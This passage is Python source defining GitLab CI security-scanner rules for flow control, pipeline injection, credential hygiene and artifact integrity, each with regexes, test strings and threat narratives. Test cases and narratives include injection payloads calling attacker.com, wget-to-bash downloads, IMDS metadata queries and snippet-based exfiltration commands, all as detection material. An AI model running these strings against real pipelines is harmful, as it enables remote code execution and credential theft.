"""GitLab CI extended rules — Flow Control, PPE, Credential Hygiene, System Config, Artifact Integrity.

Covers OWASP CICD-SEC-1, SEC-2, SEC-4, SEC-5, SEC-6 (extended), SEC-7, SEC-9.
These were entirely missing or undercovered in the initial implementation.
"""

from taintly.models import (
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

RULES: list[Rule] = [
    # =========================================================================
    # CICD-SEC-1: Insufficient Flow Control Mechanisms
    # =========================================================================
    Rule(
        id="SEC1-GL-001",
        title="Production environment deployment without manual approval gate",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A job targets a production/staging environment but does not require manual "
            "approval via 'when: manual'. Without a manual gate, any pipeline trigger "
            "(including a compromised branch push) causes immediate deployment to production. "
            "Human oversight is a critical last-resort control for privileged deployments."
        ),
        pattern=SequencePattern(
            pattern_a=r"environment:\s*(production|prod|staging|live|release)\s*$",
            absent_within=r"when:\s*manual",
            lookahead_lines=10,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Add a manual approval gate to production deployment jobs. Prefer the modern "
            "`rules:` syntax over the deprecated `only:` keyword:\n"
            "\n"
            "deploy_production:\n"
            "  environment: production\n"
            "  when: manual\n"
            "  rules:\n"
            "    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'"
        ),
        reference="https://docs.gitlab.com/ci/environments/",
        test_positive=[
            "deploy_prod:\n  stage: deploy\n  environment: production\n  script:\n    - ./deploy.sh",
            "release:\n  environment: staging\n  script:\n    - ./release.sh\n  only:\n    - main",
        ],
        test_negative=[
            "deploy_prod:\n  environment: production\n  when: manual\n  script:\n    - ./deploy.sh",
            "build:\n  script:\n    - make build",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Any pipeline trigger — including a compromised branch push or a scheduled job "
            "taken over by an attacker — can deploy directly to production with no human "
            "review. Manual approval gates are the last barrier between automated CI/CD and "
            "production scope."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution
    # =========================================================================
    Rule(
        id="SEC4-GL-001",
        title="User-controlled GitLab CI variable used unquoted in shell script",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "User-controlled GitLab predefined variables (CI_COMMIT_MESSAGE, "
            "CI_MERGE_REQUEST_TITLE, CI_MERGE_REQUEST_DESCRIPTION, CI_COMMIT_BRANCH, "
            "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME) are used unquoted in shell scripts. "
            "These values are attacker-controlled — branch names and commit messages can "
            "contain shell metacharacters, enabling command injection when unquoted. "
            "Variables wrapped in double quotes are excluded (though sanitization is still "
            "recommended for values passed to subcommands)."
        ),
        pattern=RegexPattern(
            match=r"\$\{?(CI_COMMIT_MESSAGE|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?",
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?CI_",  # YAML key-value assignment starting with $CI_
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML key-value where value is a single-quoted string (variable inside string literal, not in shell)
                r"^\s*[\w_]+:\s*\"[^\"]*\$",  # YAML key-value where value is a double-quoted string
                r"^\s*-?\s*if:",  # rules:if blocks — evaluated by GitLab engine, not shell
                r'"\$\{?(CI_COMMIT_MESSAGE|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?"',  # double-quoted usage in shell
                r"'\$\{?(CI_COMMIT_MESSAGE|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?'",  # single-quoted shell usage: `$VAR` is literal, no expansion
            ],
            # Quoted-marker heredoc bodies (<<'EOF' / <<"EOF" / <<\EOF)
            # suppress $VAR expansion per Bash §3.6.6; skip those lines.
            heredoc_aware=True,
        ),
        remediation=(
            "Double-quote the variable in shell, or sanitize before use.\n"
            "`taintly --fix` will wrap unquoted occurrences for you:\n"
            '  - echo "$CI_COMMIT_MESSAGE"\n'
            "For values passed to subcommands, also sanitize via parameter expansion:\n"
            '  - SAFE_BRANCH="${CI_COMMIT_BRANCH//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_BRANCH"'
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            "    - echo $CI_COMMIT_MESSAGE",
            "    - git tag $CI_MERGE_REQUEST_TITLE",
            "    - deploy.sh $CI_COMMIT_BRANCH",
        ],
        test_negative=[
            "    # uses $CI_COMMIT_MESSAGE for logging",
            "    # CI_COMMIT_MESSAGE is logged elsewhere",
            '    - if: $CI_COMMIT_BRANCH == "main"',
            "    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/",
            '    - echo "$CI_COMMIT_MESSAGE"',
            '    - deploy.sh "$CI_COMMIT_BRANCH"',
            '    - git tag "$CI_MERGE_REQUEST_TITLE"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Branch names and commit messages are attacker-controlled: a contributor can "
            "set a branch name containing shell metacharacters — such as `$(curl "
            "attacker.com|sh)` — that execute when CI_COMMIT_BRANCH is interpolated "
            "unquoted in a script. The injected commands run with the full permissions of "
            "the GitLab runner token."
        ),
    ),
    Rule(
        id="SEC4-GL-002",
        title="Trigger job passes CI_JOB_TOKEN or sensitive variables to downstream pipeline",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A trigger: job passes CI_JOB_TOKEN, CI_REGISTRY_PASSWORD, or CI_DEPLOY_PASSWORD "
            "as variables to a downstream pipeline. Downstream projects may have weaker access "
            "controls than the triggering project. If the downstream project is compromised, "
            "the upstream token/credentials are exposed."
        ),
        pattern=ContextPattern(
            anchor=r"(CI_JOB_TOKEN|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD)",
            requires=r"trigger:",
            exclude=[r"^\s*#"],
            scope="job",  # Both patterns are job-level; prevents cross-job false positives
        ),
        remediation=(
            "Use project access tokens with minimum required scopes for cross-project triggers "
            "instead of passing CI_JOB_TOKEN. Review downstream project permissions before "
            "passing any credential variables."
        ),
        reference="https://docs.gitlab.com/ci/triggers/",
        test_positive=[
            "trigger_downstream:\n  trigger:\n    project: my-group/my-project\n  variables:\n    UPSTREAM_TOKEN: $CI_JOB_TOKEN",
        ],
        test_negative=[
            "trigger_downstream:\n  trigger:\n    project: my-group/my-project\n  variables:\n    ENV: production",
            "build:\n  script:\n    - docker login -u gitlab-ci-token -p $CI_JOB_TOKEN",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "CI_JOB_TOKEN forwarded to a downstream pipeline grants that pipeline the same "
            "repository access scope as the originating project, potentially bridging trust "
            "boundaries between projects. A compromised downstream pipeline can use the "
            "forwarded token to read protected variables, push to the upstream repository, "
            "or trigger further pipelines."
        ),
    ),
    # =========================================================================
    # CICD-SEC-6: Insufficient Credential Hygiene — extended
    # =========================================================================
    Rule(
        id="SEC6-GL-006",
        title="wget/bash pattern or bash-subshell-curl in script block",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "Script uses wget piped to shell, bash <(curl ...) subshell, or PowerShell iex() "
            "to download and execute remote code. These patterns bypass the separate "
            "download-then-verify workflow and execute remote code with no integrity check. "
            "Extends SEC6-GL-002 to cover patterns that rule misses."
        ),
        pattern=RegexPattern(
            match=r"(wget\s[^|\n]*\|\s*(bash|sh|zsh|python|perl))|(bash\s*<\s*\(\s*curl)|(iex\s*\(.*Invoke-WebRequest)|(\|\s*python\s+-c\s+['\"])",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Download the script separately, verify its checksum, then execute:\n"
            "  - wget -q -O install.sh https://example.com/install.sh\n"
            "  - echo '<expected_sha256>  install.sh' | sha256sum -c -\n"
            "  - bash install.sh"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            "    - wget -q -O - https://example.com/setup.sh | bash",
            "    - wget https://example.com/install.sh | sh",
            "    - bash <(curl -s https://example.com/bootstrap.sh)",
        ],
        test_negative=[
            "    - wget -q -O setup.sh https://example.com/setup.sh",
            "    - curl -fsSL -o install.sh https://example.com/install.sh",
            "    # wget https://example.com | bash",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Piping a remote script to bash or executing a URL via shell substitution gives "
            "the remote server arbitrary code execution in your runner with no opportunity "
            "to inspect what will be executed before it runs. DNS hijacking, CDN "
            "compromise, or a supply chain attack on the hosting domain is sufficient to "
            "substitute a malicious payload."
        ),
    ),
    Rule(
        id="SEC6-GL-007",
        title="Long-lived cloud credentials in GitLab CI configuration",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "Pipeline configuration references long-lived cloud credentials "
            "(AWS access keys, GCP service account keys, Azure client secrets). "
            "These should be replaced with OIDC-based short-lived tokens via GitLab's "
            "ID token feature, which generates ephemeral credentials scoped to the pipeline."
        ),
        pattern=RegexPattern(
            match=r"(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_CREDENTIALS|AZURE_CLIENT_SECRET|AZURE_CREDENTIALS)\s*:",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use GitLab CI OIDC ID tokens for cloud authentication:\n"
            "job:\n  id_tokens:\n    AWS_OIDC_TOKEN:\n      aud: sts.amazonaws.com\n"
            "  script:\n    - aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --web-identity-token $AWS_OIDC_TOKEN"
        ),
        reference="https://docs.gitlab.com/ci/cloud_services/",
        test_positive=[
            "    AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID",
            "  variables:\n    AWS_SECRET_ACCESS_KEY: $SECRET",
            "    GOOGLE_APPLICATION_CREDENTIALS: /keys/service-account.json",
        ],
        test_negative=[
            "    AWS_REGION: us-east-1",
            "    # AWS_ACCESS_KEY_ID: old-key",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Long-lived cloud credentials that are exfiltrated from a runner environment "
            "remain valid indefinitely until manually rotated, unlike OIDC tokens which "
            "expire within minutes. An attacker who reads the credential from a log, a job "
            "trace, or a compromised runner gains persistent cloud access independent of "
            "the CI/CD system."
        ),
    ),
    # =========================================================================
    # SEC6-GL-009: Exfil-shaped primitive in GitLab CI script: block.
    # GitLab port of SEC6-GH-008 (Wiz prt-scan class, April 2026).
    #
    # GitLab API primitives that exist for legitimate operations but
    # also serve as zero-infrastructure exfiltration channels — traffic
    # goes to gitlab.com (or the self-managed instance), not to an
    # attacker-owned host, so DNS/IP blocklists never see it.
    #
    # The four primitives:
    #   (a) Snippet drop:   `glab snippet create` / `glab api -X POST
    #       /snippets` / API call to `/projects/:id/snippets`.  Snippets
    #       can be public / internal / private; a public snippet is the
    #       GitLab analog of a public gist.  Attacker reads it from
    #       their own account.
    #   (b) Issue / note drop:  `glab issue create` / `glab mr note
    #       create` / `glab api -X POST .../issues` / `.../notes` /
    #       `.../discussions`.  Issue body / comment body becomes the
    #       data channel.
    #   (c) IMDS:  `curl 169.254.169.254` / `wget 169.254.169.254`.
    #       GitLab runners that run on cloud compute (especially
    #       self-hosted AWS / GCP / Azure) expose instance-role tokens
    #       via IMDS.  IPv6 form `[fd00:ec2::254]` for AWS.
    #   (d) Runner registration: `curl $CI_API_V4_URL/runners` with
    #       a registration-token body, or `glab api -X POST /runners`.
    #       Lets an attacker register their own machine as a runner for
    #       the victim group/project.
    # =========================================================================
    Rule(
        id="SEC6-GL-009",
        title=(
            "Exfil-shaped primitive in GitLab script: block "
            "(snippet / issue-note / IMDS / runner-register)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A GitLab CI ``script:`` block invokes a primitive that "
            "matches the exfiltration signature used by the Wiz-"
            "disclosed prt-scan campaign (April 2026) and the "
            "Stawinski PyTorch / Praetorian self-hosted-runner "
            "compromises.  The primitives are:\n"
            "  - ``glab snippet create`` / ``glab api -X POST /snippets`` "
            "— public-snippet drop channel.\n"
            "  - ``glab issue create`` / ``glab mr note create`` / "
            "``glab api -X POST`` targeting ``/issues`` / ``/notes`` "
            "/ ``/discussions`` — issue-body / comment-body drop.\n"
            "  - ``curl 169.254.169.254`` / ``wget 169.254.169.254`` "
            "(and IPv6 ``[fd00:ec2::254]``) — IMDS on cloud-compute "
            "runners yields temporary cloud credentials.\n"
            "  - ``curl $CI_API_V4_URL/runners`` / "
            "``glab api -X POST /runners`` with a registration "
            "token — self-hosted-runner enrollment lets an attacker "
            "register their own machine as a runner.\n"
            "Each primitive has legitimate uses (publishing a release "
            "snippet, intentional IMDS queries on a narrow-role "
            "instance, dynamic runner orchestration in a GitLab ops "
            "pipeline).  The rule surfaces presence so a reviewer can "
            "verify intent.  Signal is especially high when the "
            "workflow also triggers on MR events or reads MR-author-"
            "controlled context."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # Snippet drop channel
                r"\bglab\s+snippet\s+create\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/snippets\b"
                # Issue / MR note / discussion drop — require POST verb so
                # plain reads (`glab api /projects/x/issues` GET) don't fire.
                r"|\bglab\s+(?:issue|mr)\s+(?:create|note)\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/projects/[^\s/]+/(?:issues|merge_requests|notes|discussions)"
                # IMDS — IPv4 + IPv6 link-local forms
                r"|\b(?:curl|wget|http)\s+[^#\n]*169\.254\.169\.254"
                r"|\b(?:curl|wget|http)\s+[^#\n]*\[fd00:ec2::254\]"
                # Runner registration via curl to CI_API_V4_URL /runners
                r"|\b(?:curl|wget)\s+[^#\n]*\$(?:CI_API_V4_URL|GITLAB_URL|CI_SERVER_URL)[^#\n]*/runners\b"
                # Runner registration via glab api
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*/runners\b"
                r")"
            ),
            exclude=[
                r"^\s*#",
                # `glab release upload` / `glab ci lint` / `glab mr view`
                # are reads or non-exfil writes — not matched by the
                # anchor, no exclude needed, documenting for clarity.
            ],
        ),
        remediation=(
            "Each primitive has a legitimate use, so the remediation\n"
            "is specific to why it's there:\n"
            "  - `glab snippet create` — if you're dropping a report,\n"
            "    attach it to a release via `glab release upload`\n"
            "    instead; snippets default to the project visibility,\n"
            "    so a public-project snippet is readable by anyone.\n"
            "  - `glab api POST .../issues` / `.../notes` — only\n"
            "    legitimate on trusted triggers (push to protected\n"
            "    branch, `schedule`, `workflow_dispatch` equivalent\n"
            "    via `workflow:` rules).  Never on MR pipelines where\n"
            "    the body content can include attacker-steered text.\n"
            "  - `curl 169.254.169.254` (IMDS) — on GitLab shared\n"
            "    runners IMDS isn't present; on self-hosted cloud\n"
            "    runners, narrow the instance role (single ARN, not\n"
            "    `*:*`), require IMDSv2, set hop-limit 1.  Prefer\n"
            "    OIDC-federated credentials via `id_tokens:` (see\n"
            "    SEC6-GL-007 guide).\n"
            "  - Runner registration-token POST — this is an ops\n"
            "    action.  Only run it in a maintainer-triggered\n"
            "    pipeline with a protected environment.  Presence on\n"
            "    an MR-triggered pipeline means an MR author can\n"
            "    register their own machine as a runner.\n"
            "Run `taintly --guide SEC6-GH-008` for the full\n"
            "checklist — the GitHub guide applies directly with\n"
            "`glab` / `$CI_API_V4_URL` substitutions."
        ),
        reference=(
            "https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign; "
            "https://safedep.io/prt-scan-github-actions-exfiltration-campaign/; "
            "https://docs.gitlab.com/ee/user/snippets.html; "
            "https://docs.gitlab.com/ee/api/runners.html"
        ),
        test_positive=[
            # glab snippet drop
            ("run:\n  script:\n    - glab snippet create --title exfil --content @loot.json"),
            # glab issue create
            ('run:\n  script:\n    - glab issue create --title x --description "$LOOT"'),
            # glab api POST issues
            (
                "run:\n  script:\n"
                "    - glab api -X POST /projects/1/issues -F title=x -F description=y"
            ),
            # IMDS curl
            ("run:\n  script:\n    - curl -s http://169.254.169.254/latest/meta-data/"),
            # Runner registration via curl
            ("run:\n  script:\n    - curl -X POST --form token=$TOK $CI_API_V4_URL/runners"),
            # glab api POST /runners
            ("run:\n  script:\n    - glab api -X POST /runners -F token=$TOK"),
        ],
        test_negative=[
            # glab release upload — legitimate, different primitive
            ("release:\n  script:\n    - glab release upload v1.0 artifact.zip"),
            # glab api GET (read) — no POST/PUT/PATCH
            ("read:\n  script:\n    - glab api /projects/1/issues/42"),
            # IMDS IP in a comment, not a curl
            ("doc:\n  script:\n    - echo 'IMDS is at 169.254.169.254'"),
            # curl to an unrelated URL
            ("health:\n  script:\n    - curl https://api.example.com/health"),
            # glab api to an unrelated endpoint
            ("me:\n  script:\n    - glab api /user"),
            # Commented out
            ("job:\n  script:\n    # - curl http://169.254.169.254\n    - echo hi"),
        ],
        stride=["I", "E", "R"],
        threat_narrative=(
            "Zero-infrastructure exfiltration.  The attacker never "
            "owns a DNS name or an IP address — traffic goes to "
            "gitlab.com (or the victim's self-managed instance) or "
            "to IMDS, both of which are on every defensive "
            "allowlist.  The attacker publishes a sockpuppet GitLab "
            "account, opens a fork MR whose pipeline runs "
            "``glab snippet create`` with the loot, then reads the "
            "snippet from their own account.  The Stawinski / "
            "Praetorian self-hosted-runner post-mortems document "
            "the IMDS + runner-registration pivot for CI "
            "compromise."
        ),
        confidence="low",
        incidents=[
            "prt-scan (Wiz, Apr 2026) — GH analog",
            "PyTorch supply chain (Stawinski, Jan 2024) — GH analog",
            "TensorFlow self-hosted runner (Praetorian, 2024) — GH analog",
        ],
    ),
    # =========================================================================
    # CICD-SEC-7: Insecure System Configuration
    # =========================================================================
    Rule(
        id="SEC7-GL-001",
        title="GitLab CI debug trace enabled — secrets printed to job logs",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-7",
        description=(
            "CI_DEBUG_TRACE or CI_DEBUG_SERVICES is set to true in the pipeline configuration. "
            "Debug trace prints every command, environment variable, and script expansion "
            "to job logs — this includes all CI/CD variables marked as masked or protected. "
            "Logs may be accessible to unauthorized users in public or internal projects."
        ),
        pattern=RegexPattern(
            match=r"(CI_DEBUG_TRACE|CI_DEBUG_SERVICES)\s*:\s*['\"]?([Tt]rue|1)['\"]?",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Remove CI_DEBUG_TRACE from the pipeline config. Debug trace exposes the "
            "cleartext value of every variable visible to the job — including variables "
            "marked both Masked and Protected — in the job log. Marking CI_DEBUG_TRACE "
            "itself as 'Protected' does not reduce the data it leaks; it only limits "
            "where debug mode activates.\n"
            "\n"
            "If debugging a pipeline is genuinely required, rotate any secrets visible "
            "to the job after the debug run and restrict who can view the job log."
        ),
        reference="https://docs.gitlab.com/ci/variables/#enable-debug-logging",
        test_positive=[
            "  CI_DEBUG_TRACE: true",
            "  CI_DEBUG_TRACE: 'true'",
            "  CI_DEBUG_SERVICES: true",
        ],
        test_negative=[
            "  CI_JOB_TOKEN: $CI_JOB_TOKEN",
            "  # CI_DEBUG_TRACE: true",
            "  CI_DEBUG_TRACE: false",
        ],
        stride=["I"],
        threat_narrative=(
            "GitLab CI_DEBUG_TRACE enables verbose step-by-step logging that includes the "
            "values of masked CI/CD variables in plain text, bypassing the masking "
            "protection. Attackers with access to job logs can read all secrets while the "
            "debug trace is active, including tokens, API keys, and deployment credentials."
        ),
    ),
    # =========================================================================
    # CICD-SEC-9: Improper Artifact Integrity Validation
    # =========================================================================
    Rule(
        id="SEC9-GL-001",
        title="Artifacts block without access restriction in potentially public project",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-9",
        # 2026-04-27 audit: route to review-needed. The threat
        # narrative ("anonymous users can download these") only
        # applies to public projects with sensitive artifact content,
        # neither of which is visible from the CI YAML alone. Field
        # test (gitlabhq, 2026-04) showed this rule firing on every
        # job that produces an artifact, dominating the finding
        # volume on internal projects where the threat doesn't apply.
        review_needed=True,
        confidence="low",
        description=(
            "Job produces artifacts without specifying an `artifacts:access:` value. In "
            "public GitLab projects, artifacts are downloadable by anonymous users by "
            "default. Artifacts may contain build outputs, environment details, dependency "
            "lists, or log content that reveals internal infrastructure. Valid values for "
            "`artifacts:access:` are `all` (default), `developer`, and `none` (GitLab 17.x "
            "also added `maintainer`)."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*artifacts:\s*$",
            absent_within=r"access:\s*(developer|none|maintainer)",
            lookahead_lines=12,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Set an explicit access level on artifact blocks. Valid values are "
            "`all` (default), `developer`, `none`, and `maintainer` (GitLab 17.x+):\n"
            "\n"
            "artifacts:\n"
            "  access: developer   # was: implicit `all`\n"
            "  paths:\n"
            "    - dist/"
        ),
        reference="https://docs.gitlab.com/ci/yaml/#artifactsaccess",
        test_positive=[
            "build:\n  script:\n    - make build\n  artifacts:\n    paths:\n      - dist/",
            "test:\n  script:\n    - pytest\n  artifacts:\n    reports:\n      junit: report.xml",
        ],
        test_negative=[
            "build:\n  script:\n    - make build\n  artifacts:\n    access: developer\n    paths:\n      - dist/",
            "test:\n  script:\n    - pytest\n  artifacts:\n    access: none\n    reports:\n      junit: report.xml",
        ],
        stride=["I"],
        threat_narrative=(
            "Artifacts without access restriction in a public project are downloadable by "
            "anyone who knows the job URL, including unauthenticated users. Build outputs "
            "may contain compiled binaries, environment dumps, test coverage reports, or "
            "dependency lockfiles that reveal internal library versions useful for targeted "
            "attacks."
        ),
    ),
    Rule(
        id="SEC9-GL-002",
        title="Binary or script downloaded without checksum verification",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-9",
        description=(
            "Pipeline downloads a binary or script file using curl/wget and executes it "
            "without verifying a checksum (sha256sum, shasum, cosign, gpg). "
            "Compromised download sources can deliver malicious payloads that run with "
            "full access to CI/CD variables and deployment credentials."
        ),
        pattern=SequencePattern(
            pattern_a=r"(curl|wget)\s+[^\n]*\.(sh|py|tar\.gz|tgz|zip|exe|bin|deb|rpm)\b",
            absent_within=r"(sha256sum|sha512sum|shasum|md5sum|cosign\s+verify|gpg\s+--verify)",
            lookahead_lines=5,
            exclude=[r"^\s*#", r"\|\s*(bash|sh|zsh|python|perl)"],
        ),
        remediation=(
            "Verify checksums after downloading binaries:\n"
            "  - curl -fsSL -o tool.tar.gz https://example.com/tool-v1.0.tar.gz\n"
            "  - echo 'abc123def456...  tool.tar.gz' | sha256sum -c -\n"
            "  - tar xzf tool.tar.gz"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09:_Improper_Artifact_Integrity_Validation",
        test_positive=[
            "    - curl -fsSL -o tool.bin https://example.com/releases/v1.0/tool.bin\n    - chmod +x tool.bin && ./tool.bin --version",
            "    - wget -q https://example.com/installer.sh\n    - bash installer.sh",
        ],
        test_negative=[
            "    - curl -fsSL -o tool.tar.gz https://example.com/tool.tar.gz\n    - echo 'abc123  tool.tar.gz' | sha256sum -c -",
            "    - curl -o cosign https://github.com/sigstore/cosign/releases/download/v2.0.0/cosign-linux-amd64\n    - cosign verify-blob --signature cosign.sig artifact.tar.gz",
        ],
        stride=["T"],
        threat_narrative=(
            "Downloading a binary or script without verifying its checksum allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload. "
            "The pipeline executes attacker-controlled code with full access to the runner "
            "environment and all CI/CD variables before any integrity check can fire."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution — extended variable coverage
    # =========================================================================
    Rule(
        id="SEC4-GL-003",
        title="User-controlled ref/tag variable used unquoted in shell script",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "CI_COMMIT_REF_NAME, CI_COMMIT_TAG, or CI_BUILD_REF_NAME used unquoted "
            "in shell scripts. CI_COMMIT_REF_NAME is set from the branch or tag "
            "name triggering the pipeline — an attacker who can create branches "
            "can inject arbitrary shell via a crafted name "
            "(e.g. 'feature/$(curl attacker.com|sh)'). CI_COMMIT_TAG is "
            "attacker-controlled for projects that allow tag creation. "
            "CI_BUILD_REF_NAME is the deprecated alias for CI_COMMIT_REF_NAME "
            "and carries the same risk.\n\n"
            "Not included: CI_MERGE_REQUEST_SOURCE_BRANCH_SHA and other "
            "*_SHA variables. Those always hold 40-char hex commit hashes "
            "and cannot contain shell metacharacters, so unquoted usage "
            "has no injection surface regardless of who controlled the "
            "source branch (dogfood on gitlab.com/gitlab-org/gitlab-runner "
            "surfaced this FP; removed from the match set)."
        ),
        pattern=RegexPattern(
            match=r"\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?",
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?CI_",  # YAML key-value starting with $CI_
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML key-value with single-quoted string value
                r'^\s*[\w_]+:\s*"[^"]*\$',  # YAML key-value with double-quoted string value
                r"^\s*[\w_]+:\s+\S",  # YAML key-value with any unquoted value (not a shell list item)
                r"^\s*-?\s*if:",  # rules:if — GitLab engine evaluates, not shell
                # Double-quoted shell context anywhere on the line.
                r'"[^"]*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^"]*"',
                # Single-quoted shell context anywhere on the line — `$VAR`
                # inside `'...'` is literal per POSIX sh §2.2.2.
                r"'[^']*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^']*'",
                # Bash `[[ ]]` conditional — per Bash manual §3.2.5.2, word
                # splitting and pathname expansion are NOT performed on words
                # between `[[` and `]]`, so an unquoted variable reference
                # there cannot inject. Surfaced as a FP on
                # gitlab.com/gitlab-org/gitlab-runner `.gitlab/ci/release.yml`
                # where `if [[ $CI_COMMIT_REF_NAME =~ ^v[0-9]+ ]]` is safe.
                # `[^\n]` (not `[^\]]`) so character classes like `[0-9]+`
                # in the regex operand don't break the closing-`]]` match.
                r"\[\[[^\n]*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^\n]*\]\]",
            ],
            heredoc_aware=True,
        ),
        remediation=(
            "Double-quote the variable or sanitize before use:\n"
            '  - echo "$CI_COMMIT_REF_NAME"\n'
            "  # For labels/tags passed to external tools, sanitize:\n"
            '  - SAFE_REF="${CI_COMMIT_REF_NAME//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_REF"'
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            "    - docker tag image:latest image:$CI_COMMIT_REF_NAME",
            "    - git push origin $CI_COMMIT_TAG",
            "    - deploy.sh --version $CI_BUILD_REF_NAME",
        ],
        test_negative=[
            '    - docker tag image:latest "image:$CI_COMMIT_REF_NAME"',
            '    - git push origin "$CI_COMMIT_TAG"',
            "    # $CI_COMMIT_REF_NAME used for logging only",
            "    - if: $CI_COMMIT_REF_NAME == 'main'",
            # Bash [[ ]] conditional — word splitting disabled per Bash §3.2.5.2.
            "    - if [[ $CI_COMMIT_REF_NAME =~ ^v[0-9]+ ]]; then echo release; fi",
            "    - if [[ $CI_COMMIT_TAG == v* ]]; then echo tagged; fi",
            # SHA variable — 40-char hex, cannot contain shell metachars.
            "    - git log --format=%h $CI_MERGE_REQUEST_SOURCE_BRANCH_SHA",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Git tag and ref names are attacker-controlled strings that can contain shell "
            "metacharacters; when used unquoted in a script they provide a command "
            "injection path exploitable by any contributor who can create a tag or open a "
            "merge request. The injected commands execute with the GitLab runner's "
            "permissions and environment."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4 continued — eval on tainted input (closes FINDINGS §F-2)
    # =========================================================================
    Rule(
        id="SEC4-GL-006",
        title="eval/bash -c invoked on an attacker-controlled CI variable",
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "`eval` (and the equivalent `bash -c` / `sh -c` one-shot forms) "
            "re-parses its argument AS SHELL SOURCE — quoting the variable "
            "does NOT help, because the quotes control how the value is "
            "delivered TO eval, not what eval does with it afterwards. "
            "When the argument is a GitLab predefined variable that an "
            "attacker can set (CI_COMMIT_MESSAGE, CI_COMMIT_BRANCH, "
            "CI_MERGE_REQUEST_TITLE, etc.), a commit message of "
            "`; curl attacker.com | sh` becomes executable shell during the "
            "build. This is a CRITICAL code-execution primitive distinct "
            "from the generic unquoted-variable class (SEC4-GL-001)."
        ),
        pattern=RegexPattern(
            # `eval` / `bash -c` / `sh -c` followed by a tainted CI
            # variable (with or without surrounding quotes — both are
            # unsafe). The string between command and variable can be
            # arbitrary (e.g. `eval "prefix $CI_COMMIT_MESSAGE"`).
            match=(
                r"\b(eval|bash\s+-c|sh\s+-c)\s+['\"]?[^'\"\n]*?"
                r"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_BRANCH|CI_COMMIT_TAG|"
                r"CI_COMMIT_REF_NAME|CI_MERGE_REQUEST_TITLE|"
